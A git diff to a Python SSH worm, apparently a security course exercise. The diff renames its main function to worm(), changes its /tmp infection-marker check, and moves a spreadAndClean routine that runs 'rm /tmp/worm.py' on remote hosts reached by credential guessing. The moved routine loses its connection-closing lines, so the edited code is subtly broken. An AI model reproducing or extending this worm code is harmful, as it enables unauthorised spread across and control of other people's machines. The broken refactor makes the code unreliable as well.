@@ -35,7 +35,7 @@ def isInfectedSystem():
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
 	# as infected). 
-	return os.path.exists(INFECTED_MARKER_FILE)
+	return os.path.isfile(INFECTED_MARKER_FILE)
 
 #################################################################
 # Marks the system as infected
@@ -80,16 +80,6 @@ def spreadAndExecute(sshClient):
 
 	sshClient.close()
 
-def spreadAndClean(sshClient):
-
-    sftpClient = sshClient.open_sftp()
-
-    sshClient.exec_command("rm /tmp/worm.py")
-
-    sftpClient.close()
-
-    sshClient.close()
-
 ############################################################
 # Try to connect to the given host given the existing
 # credentials
@@ -100,6 +90,14 @@ def spreadAndClean(sshClient):
 # return - 0 = success, 1 = probably wrong credentials, and
 # 3 = probably the server is down or is not running SSH
 ###########################################################
+
+#worm infecting other machines
+def spreadAndClean(sshClient):
+
+    sftpClient = sshClient.open_sftp()
+
+    sshClient.exec_command("rm /tmp/worm.py")
+
 def tryCredentials(host, userName, password, sshClient):
 	
 	# Tries to connect to host host using
@@ -229,7 +227,7 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-def main():
+def worm():
 
     if len(sys.argv) < 2:
 
@@ -336,4 +334,4 @@ def main():
 	            print("Spreading complete")
 
 if __name__ == "__main__":
-    main()
+    worm()
